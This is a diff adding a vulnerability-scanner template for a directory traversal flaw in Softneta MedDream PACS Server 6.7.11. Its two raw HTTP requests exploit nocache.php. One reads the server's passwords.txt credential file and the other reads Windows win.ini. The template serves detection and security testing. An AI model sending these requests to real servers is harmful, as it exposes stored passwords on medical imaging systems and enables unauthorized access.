@@ -1,0 +1,40 @@
+id: softneta-meddream-dir-traversal
+info:
+  name: Softneta MedDream 6.7.11 Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Softneta MedDream PACS Server Premium 6.7.11 nocache.php has a directory traversal vulnerability that allows unauthorized file read operations.
+  reference:
+    - https://www.exploit-db.com/exploits/45347
+    - https://www.softneta.com/products/meddream-pacs-server/downloads.html
+
+http:
+  - raw:
+      - |
+        GET /Pacs/nocache.php?path=../../../../../../../../../../../../../../../../MedDreamPACS-Premium/passwords.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "MedDream"
+          - "password"
+
+  - raw:
+      - |
+        GET /Pacs/nocache.php?path=/../../../../../../Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[fonts]"
